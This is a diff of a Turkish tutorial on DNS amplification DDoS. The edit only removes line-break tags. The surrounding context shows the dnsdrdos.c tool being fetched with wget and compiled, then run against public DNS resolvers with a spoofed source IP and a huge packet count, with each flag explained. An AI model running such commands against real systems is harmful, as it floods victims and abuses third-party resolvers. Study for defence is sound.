@@ -102,7 +102,6 @@ root@Stormer:~# wget https://raw.githubusercontent.com/nullsecuritynet/tools/mas
 ..
 root@Stormer:~# gcc dnsdrdos.c -o dnsdrdos -Wall -ansi
 ```
-<br/>
 
 Yukarıda, “wget” komutu kullanılarak DNS çözümleyicisine istekte bulunmak için kullanılacak olan “dnsdrdos.c” dosyası indirildi. “gcc” programı ile kod parçası derlendikten sonra çalıştırılmaya hazır hale getirildi. Resim7’de herkese açık DNS çözümleyicilerinden 6 tanesi gösterilmektedir.
 
@@ -110,14 +109,12 @@ Yukarıda, “wget” komutu kullanılarak DNS çözümleyicisine istekte bulunm
 |:--:|
 | *Resim7 : Herkese açık birkaç DNS çözümleyicisi* |
 
-<br/>
 
 Resim7’de, 6 tane DNS çözümleyicisinin IP adresleri publicDns.txt dosyası içerisinde bulunmaktadır. Böylece yapılan DNS istekleri, publicDns.txt dosyası içerisindeki DNS çözümleyicilerine gönderilir. 
 
 ```linux
 root@Stormer:~# ./dnsdrdos -f publicDns.txt -s 192.168.30.1 -l 100000000000
 ```
-<br/>
 
 **–f** parametresi ile herkesin erişimine açık olan birkaç DNS çözümleyicisinin IP adresinin olduğu dosya belirtildi. –s parametresi ile ise DNS çözümleyicilerine gönderilecek istek üzerinde kaynak IP manipülasyonu yapılarak 192.168.30.1 IP adresi kaynak IP adresi olarak belirtildi. -l parametresi ile gönderilecek paket sayısı belirtildi.
 
